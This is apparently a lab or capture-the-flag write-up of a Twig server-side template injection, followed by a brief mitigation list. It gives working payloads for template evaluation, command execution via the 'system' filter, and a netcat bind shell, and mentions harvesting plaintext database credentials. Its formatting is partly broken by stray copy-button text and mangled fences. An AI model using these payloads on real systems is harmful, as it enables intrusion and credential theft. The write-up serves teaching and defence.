# Exploitation

## Reconnaissance
A port scan revealed:
- HTTP service running on port 80
- MySQL service running on port 3306

The web application was accessible via a browser and allowed
user-generated comments.

## SSTI Detection
The following payload was submitted via a comment field:

```twig
{{7*7}}
The application responded with:

Kodu kopyala
49
This confirmed server-side template evaluation.

Template Engine Identification
The following payload was used:

twig
Kodu kopyala
{{7*'7'}}
The output was:

Kodu kopyala
49
This behavior matches Twig, as Jinja2 would return 7777777.

Command Execution
Twig allows function filters to be abused.
The following payload demonstrated command execution:

twig
Kodu kopyala
{{ ['id'] | filter('system') }}
The output confirmed execution as the web server user.

Shell Access
To gain interactive access, a bind shell was initiated on the target:

twig
Kodu kopyala
{{ ['nc -nvlp 1337 -e /bin/bash'] | filter('system') }}
Connecting to the port provided a shell with www-data privileges.

Post-Exploitation
Configuration files were enumerated, revealing database credentials
stored in plaintext within application configuration files.

yaml
Kodu kopyala

---

## ðŸ“„ mitigation.md
```md
# Mitigation

To prevent SSTI vulnerabilities:

- Never render user input directly inside templates
- Use strict input validation and escaping
- Enable sandboxing features of template engines
- Avoid exposing template engine errors to users
- Store secrets securely outside web root

Using secure coding practices significantly reduces SSTI risk.
